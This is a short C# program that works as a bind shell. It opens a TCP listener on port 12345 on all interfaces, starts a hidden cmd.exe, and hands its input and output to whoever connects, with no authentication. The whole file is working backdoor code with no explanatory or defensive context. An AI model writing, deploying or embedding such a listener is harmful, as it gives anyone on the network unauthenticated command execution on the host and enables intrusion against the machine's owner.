using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;

class Program
{
    static void Main()
    {
        int port = 12345; // Change this to the desired port number

        TcpListener listener = new TcpListener(IPAddress.Any, port);
        listener.Start();
        Console.WriteLine($"Listening on port {port}...");

        TcpClient client = listener.AcceptTcpClient();
        Console.WriteLine($"Connection established from {((IPEndPoint)client.Client.RemoteEndPoint).Address}");

        NetworkStream stream = client.GetStream();
        StreamReader reader = new StreamReader(stream);
        StreamWriter writer = new StreamWriter(stream);
        writer.AutoFlush = true;

        Process process = new Process();
        process.StartInfo.FileName = "cmd.exe";
        process.StartInfo.CreateNoWindow = true;
        process.StartInfo.UseShellExecute = false;
        process.StartInfo.RedirectStandardInput = true;
        process.StartInfo.RedirectStandardOutput = true;
        process.StartInfo.RedirectStandardError = true;

        process.OutputDataReceived += (sender, e) => writer.WriteLine(e.Data);
        process.ErrorDataReceived += (sender, e) => writer.WriteLine(e.Data);

        process.Start();
        process.BeginOutputReadLine();
        process.BeginErrorReadLine();

        string input;
        while ((input = reader.ReadLine()) != null)
        {
            process.StandardInput.WriteLine(input);
        }

        process.WaitForExit();
        process.Close();
        listener.Stop();
    }
}
